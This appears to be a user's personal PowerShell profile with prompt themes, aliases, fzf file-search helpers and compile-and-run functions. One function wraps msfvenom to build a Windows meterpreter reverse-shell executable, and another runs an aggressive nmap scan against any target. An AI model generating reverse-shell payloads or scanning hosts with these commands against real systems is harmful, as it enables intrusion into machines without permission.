# Initialize Oh My Posh with Default Theme
# Example themes already initialized (Uncomment as needed)
# oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\json.omp.json' | Invoke-Expression
# oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\cloud-native-azure.omp.json' | Invoke-Expression
oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\atomicBit.omp.json' | Invoke-Expression
# oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\chips.omp.json' | Invoke-Expression
# oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\dracula.omp.json' | Invoke-Expression
# oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\if_tea.omp.json' | Invoke-Expression
# oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\sonicboom_dark.omp.json' | Invoke-Expression
# oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\atomic.omp.json' | Invoke-Expression
# oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\blue-owl.omp.json' | Invoke-Expression
# oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\bubbles.omp.json' | Invoke-Expression
# oh-my-posh init pwsh --config 'C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\devious-diamonds.omp.json' | Invoke-Expression
# Simulate pressing F2 on terminal start

$env:PATH += ";$env:USERPROFILE\.local\bin"

# Import functionality
Import-Module PSFzf
Import-Module PSWindowsUpdate
# Import-Module PSColor
Import-Module PSReadLine
Set-PSReadLineOption -PredictionSource History
Import-Module -Name Terminal-Icons
Import-Module PSGitHub
 #Define a function to switch themes dynamically
function Set-PoshTheme {
    param (
        [Parameter(Mandatory)]
        [string]$Theme
    )
    $themePath = "C:\Users\Amr khaled\AppData\Local\Programs\oh-my-posh\themes\$Theme.omp.json"
    if (Test-Path $themePath) {
        oh-my-posh init pwsh --config $themePath | Invoke-Expression
        Write-Host "Switched to theme: $Theme" -ForegroundColor Green
    } else {
        Write-Host "Theme '$Theme' not found!" -ForegroundColor Red
    }
}

# Menu to switch themes dynamically with fuzzy search
function Choose-PoshTheme {
    $themes = @(
    "jandedobbeleer",
    "chips",
    "dracula",
    "if_tea",
    "sonicboom_dark",
    "atomic",
    "blue-owl",
    "bubbles",
    "devious-diamonds",
    "cloud-native-azure",
    "mario",
    "powerline",
    "paradox",
    "pure",
    "snowy-night",
    "tango",
    "vscode",
    "powerline-v2",
    "crystal",
    "horizon",
    "sphinx",
    "old-skool",
    "seabird",
    "new-age",
    "macchiato",
    "react",
    "dracula-dark",
    "frodo",
    "night-owl",
    "1_shell",
    "agnoster.minimal",
    "agnoster",
    "agnosterplus",
    "aliens",
    "amro",
    "atomicBit",
    "avit",
    "blueish",
    "bubblesextra",
    "bubblesline",
    "capr4n",
    "catppuccin_frappe",
    "catppuccin_latte",
    "catppuccin_macchiato",
    "catppuccin_mocha",
    "catppuccin",
    "cert",
    "cinnamon",
    "clean-detailed",
    "cloud-context",
    "cobalt2",
    "craver",
    "darkblood",
    "di4am0nd",
    "easy-term",
    "emodipt-extend",
    "emodipt",
    "fish",
    "free-ukraine",
    "froczh",
    "gmay",
    "grandpa-style",
    "gruvbox",
    "half-life",
    "honukai",
    "hotstick.minimal",
    "hul10",
    "hunk",
    "huvix",
    "illusi0n",
    "iterm2",
    "jblab_2021",
    "jonnychipz",
    "json",
    "jtracey93",
    "jv_sitecorian",
    "kali",
    "kushal",
    "lambda",
    "lambdageneration",
    "larserikfinholt",
    "lightgreen",
    "M365Princess",
    "marcduiker",
    "markbull",
    "material",
    "microverse-power",
    "mojada"
)

    Write-Host "Available Themes:" -ForegroundColor Cyan
    $themes | fzf --preview 'echo {}' --preview-window=up:20 | ForEach-Object {
        Set-PoshTheme -Theme $_
    }
}








# Aliases for common commands
Set-Alias posh-theme Choose-PoshTheme
#Set-Alias tt tree
Set-Alias gnip Get-NetIPAddress
Set-Alias vim nvim
Set-Alias alies Get-Alias
Set-Alias edit notepad
Set-Alias pscan Test-NetConnection  # Alias for testing network connections

# Functions for extended functionality
# network analyzer
Function getip { Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' } }
function get-public-ip {
    $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org").ip
    Write-Output "Public IP: $publicIP"
}
Set-Alias publicip get-public-ip
function recon {
    param (
        [string]$target
    )
    nmap -sS -A -T4 $target
}
Set-Alias nmap-scan recon

# File and directory operations
Function ll {
    param (
        [string]$Path = "."
    )
    Get-ChildItem -Force -Path $Path | Sort-Object Name
}
Function lsr {
    param (
        [string]$Path = "."
    )
    Get-ChildItem -Recurse -Force -Path $Path
}
Function gs { Get-Service }
Function md { New-Item -ItemType Directory }
# Function to delete a file or directory with options for -r, -f, or -rf
function rm {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Path,
        
        [switch]$r,   # -r flag for recursive
        [switch]$f,   # -f flag for force
        [switch]$rf   # -rf flag for recursive and force (combined)
    )
    
    # If -rf is specified, set both -r and -f
    if ($rf) {
        $r = $true
        $f = $true
    }

    # Determine the flags to apply
    $force = $false
    $recurse = $false
    
    if ($f) {
        $force = $true
    }
    if ($r) {
        $recurse = $true
    }

    # Force remove the item, handling read-only, hidden, and system files
    Remove-Item -Path $Path -Recurse:$recurse -Force:$force
}


Function netinfo { Get-NetAdapter | Select-Object Name, Status, MacAddress, LinkSpeed }
Function pingtest { Test-Connection -Count 4 }
Function ports { Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State }
Function size { Get-ChildItem -Recurse | Measure-Object -Property Length -Sum | Select-Object Count, Sum }
# Function tree { Get-ChildItem -Recurse -Force | Format-Table FullName, Attributes }
Function listusers { Get-LocalUser }
Function groups { Get-LocalGroupMember -Group "Administrators" }
Function clsrv { Clear-DnsClientCache }
Function cpuinfo { Get-WmiObject Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed }
Function raminfo { Get-WmiObject Win32_PhysicalMemory | Select-Object Manufacturer, Capacity, Speed }
Function sysinfo { Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture, CsManufacturer, CsModel }
function check-disk {
    Get-PSDrive | Where-Object { $_.Used -ne $null } | Select-Object Name, @{n="Used (GB)";e={[math]::Round($_.Used/1GB,2)}}, @{n="Free (GB)";e={[math]::Round($_.Free/1GB,2)}}
}
Set-Alias disk check-disk

# Function for general search
function search {
    param (
        [string]$path = ""  # Default empty path for searching all drives
    )
    
    # If no path is provided, search all drives
    if (-not $path) {
        $searchPaths = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    } else {
        # If a path is provided, use it
        $searchPaths = $path -split ","
    }

    # Search recursively in the specified or all paths and pipe results to fzf
    Get-ChildItem -Path $searchPaths -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName } | fzf
}


function open {
    param (
        [string]$path = ""  # Default to search all drives if no path is passed
    )
    
    # Automatically detect all drives if no path is specified
    if (-not $path) {
        $searchPaths = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    } else {
        $searchPaths = $path -split ","
    }

    # Search recursively for all files in the provided path(s)
    $selection = Get-ChildItem -Path $searchPaths -Recurse -File -ErrorAction SilentlyContinue | 
        ForEach-Object { $_.FullName } | 
        fzf

    # If a file is selected, open it in nvim
    if ($selection) {
        nvim $selection
    } else {
        Write-Host "No file selected." -ForegroundColor Red
    }
}



# Function for fuzzy search for directories
function fuzzydirs {
    param (
        [string]$path = "" # Default to search all drives if no path is passed
    )
    
    # Automatically detect all drives if no path is specified
    if (-not $path) {
        $searchPaths = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    } else {
        $searchPaths = $path -split ","
    }

    Get-ChildItem -Path $searchPaths -Recurse -Directory -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName } | fzf
}
Set-Alias fd fuzzydirs

# Function for fuzzy search by file extension
function fuzzyext {
    param (
        [string]$ext = "*.txt",   # Default file extension
        [string]$path = ""         # Default to search all drives if no path is passed
    )
    
    # Automatically detect all drives if no path is specified
    if (-not $path) {
        $searchPaths = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    } else {
        $searchPaths = $path -split ","
    }

    Get-ChildItem -Path $searchPaths -Recurse -File -Include $ext -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName } | fzf
}
Set-Alias fx fuzzyext

# Function for opening a file
function openfile {
    param (
        [string]$path = "" # Default to search all drives if no path is passed
    )
    
    # Automatically detect all drives if no path is specified
    if (-not $path) {
        $searchPaths = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    } else {
        $searchPaths = $path -split ","
    }

    Get-ChildItem -Path $searchPaths -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName } | fzf | ForEach-Object { code $_ }
}
Set-Alias fof openfile

# Function for search with preview
function searchpreview {
    param (
        [string]$path = "" # Default to search all drives if no path is passed
    )
    
    # Automatically detect all drives if no path is specified
    if (-not $path) {
        $searchPaths = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    } else {
        $searchPaths = $path -split ","
    }

    Get-ChildItem -Path $searchPaths -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName } | fzf --preview="if ($env:OS -eq 'Windows_NT') { type {} | Out-String } else { cat {} }"
}
Set-Alias fsp searchpreview

# Function to copy file paths (your custom function)
function copyfilepath {
    param (
        [string]$path = "" # Default to search all drives if no path is passed
    )
    
    # Automatically detect all drives if no path is specified
    if (-not $path) {
        $searchPaths = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    } else {
        $searchPaths = $path -split ","
    }

    Get-ChildItem -Path $searchPaths -Recurse -File -ErrorAction SilentlyContinue | 
        ForEach-Object { $_.FullName } | 
        fzf | Set-Clipboard
}

# Set alias for the function
Set-Alias fcfp copyfilepath

# Bind Ctrl + H to run the fcfp function (copy file path)
Set-PSReadlineKeyHandler -Key Ctrl+h -ScriptBlock {
    fcfp
}

# Function for recent files
function recentfiles {
    param (
        [int]$days = 7,           # Default days
        [string]$path = ""         # Default to search all drives if no path is passed
    )
    
    # Automatically detect all drives if no path is specified
    if (-not $path) {
        $searchPaths = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    } else {
        $searchPaths = $path -split ","
    }

    Get-ChildItem -Path $searchPaths -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddDays(-$days) } | ForEach-Object { $_.FullName } | fzf
}
Set-Alias frf recentfiles

# Function for searching text using ripgrep
function open {
    param (
        [string]$path = ""  # Default to search all drives if no path is passed
    )

    # Automatically detect all drives if no path is specified
    if (-not $path) {
        $path = (Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }) -join ","
    }

    # Search recursively for all files in the provided path(s)
    $selection = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue | 
        ForEach-Object { $_.FullName } | 
        fzf

    # If a file is selected, open it in nvim
    if ($selection) {
        nvim $selection
    } else {
        Write-Host "No file selected." -ForegroundColor Red
    }
}

# Function to open folders
function openfolder {
    param (
        [string]$path = "" # Default to search all drives if no path is passed
    )
    
    # Automatically detect all drives if no path is specified
    if (-not $path) {
        $searchPaths = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    } else {
        $searchPaths = $path -split ","
    }

    Get-ChildItem -Path $searchPaths -Recurse -Directory -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName } | fzf | ForEach-Object { Start-Process explorer $_ }
}
Set-Alias fofd openfolder

function open {
    param (
        [string]$path = "C:\"  # Default search path (can be overridden by user)
    )

    # Check if the path exists
    if (-not (Test-Path -Path $path)) {
        Write-Host "Path '$path' does not exist!" -ForegroundColor Red
        return
    }

    # Search recursively for all files in the provided path
    $selection = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue | 
        ForEach-Object { $_.FullName } | 
        fzf --preview 'powershell -Command "Get-Content {} | Select-Object -First 20"'

    # If a file is selected, open it in nvim
    if ($selection) {
        nvim $selection
    } else {
        Write-Host "No file selected." -ForegroundColor Red
    }
}








# more alies for Cybersecurity usage
function gethash {
    param (
        [string]$file
    )
    Get-FileHash -Path $file | Format-Table Algorithm, Hash
}
Set-Alias gh gethash

function msf-payload {
    param (
        [string]$type = "windows/meterpreter/reverse_tcp",
        [string]$lhost = "127.0.0.1",
        [int]$lport = 4444,
        [string]$output = "payload.exe"
    )
    msfvenom -p $type LHOST=$lhost LPORT=$lport -f exe > $output
}
Set-Alias payload msf-payload



# run programs


function run-asm {
    param (
        [string]$file
    )
    nasm -f win32 $file -o ${file}.obj && gcc -m32 ${file}.obj -o ${file}.exe && .\${file}.exe
}
Set-Alias rasm run-asm

function run-cpp {
    param (
        [string]$file
    )

    # Ensure the input file exists and has a valid extension
    if (-Not (Test-Path -Path $file)) {
        Write-Error "File '$file' does not exist."
        return
    }

    if ([System.IO.Path]::GetExtension($file) -ne ".cpp") {
        Write-Error "File '$file' is not a .cpp file."
        return
    }

    # Get the main file name (without extension) and its directory
    $filename = [System.IO.Path]::GetFileNameWithoutExtension($file)
    $dir = [System.IO.Path]::GetDirectoryName((Get-Item -Path $file).FullName)

    # Collect all .cpp files in the directory
    $cppFiles = Get-ChildItem -Path $dir -Filter "*.cpp" | ForEach-Object { $_.FullName }

    # Ensure there are .cpp files to compile
    if ($cppFiles.Count -eq 0) {
        Write-Error "No .cpp files found in the directory."
        return
    }

    # Prioritize the main file in the compilation order
    $mainFile = (Get-Item -Path $file).FullName
    $compileFiles = @($mainFile) + ($cppFiles | Where-Object { $_ -ne $mainFile })

    # Initialize an array for missing headers
    $missingHeaders = @()

    # Check for `#include` directives in all source files
    foreach ($sourceFile in $compileFiles) {
        Get-Content -Path $sourceFile | ForEach-Object {
            if ($_ -match '^\s*#include\s+"(.*?)"') {
                $headerFile = $Matches[1]
                $headerPath = Join-Path $dir $headerFile
                if (-Not (Test-Path -Path $headerPath)) {
                    $missingHeaders += $headerFile
                }
            }
        }
    }

    # If missing headers are detected, display an error
    if ($missingHeaders.Count -gt 0) {
        $missingHeaders = $missingHeaders | Sort-Object -Unique
        Write-Error "Missing header files: $($missingHeaders -join ', ')"
        return
    }

    # Compile using g++ and run the output
    try {
        g++ $compileFiles -o "$filename.exe"
        if ($LASTEXITCODE -eq 0) {
            & ".\$filename.exe"
        } else {
            Write-Error "Compilation failed. Please check your code for errors."
        }
    } catch {
        Write-Error "An error occurred during compilation or execution: $_"
    }
}

# Set an alias for easier usage
Set-Alias rcpp run-cpp




function run-java {
    param (
        [string]$file
    )
    javac $file && java ([System.IO.Path]::GetFileNameWithoutExtension($file))
}
Set-Alias rjava run-java

# Start Local PHP Server
function php-server {
    param (
        [int]$port = 8000
    )
    php -S 127.0.0.1:$port
}
Set-Alias phps php-server

# clean compiled files
function cleanCompiledFiles {
    Get-ChildItem -Path . -Include *.class,*.exe,*.obj,*.o,*.pyc -Recurse | Remove-Item -Force
}
# this function is to show all history since downloading Windows
Function Get-HistoryFuzzy {
    Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt | fzf
}


function networkTools{
     python "D:\VS code\python\networkTools.py"
}

function tsk{
     py -3.9 "D:\VS code\python\taskmaneger.py"
}
function video_downloader{ 
  python3 "D:\VS code\python\video_downloader.py"
}















Function Show-AsciiArt {
    $art = @"
  █████╗ ███╗   ███╗██████╗ 
 ██╔══██╗████╗ ████║██╔══██╗
 ███████║██╔████╔██║██████╔╝
 ██╔══██║██║╚██╔╝██║██╔══██╗
 ██║  ██║██║ ╚═╝ ██║██║  ██║
 ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
"@
    Write-Host $art -ForegroundColor Cyan
}

# Call the function
Show-AsciiArt


#f45873b3-b655-43a6-b217-97c00aa0db58 PowerToys CommandNotFound module

Import-Module -Name Microsoft.WinGet.CommandNotFound
#f45873b3-b655-43a6-b217-97c00aa0db58

Set-Alias lvim 'C:\Users\Amr khaled\.local\bin\lvim.ps1'
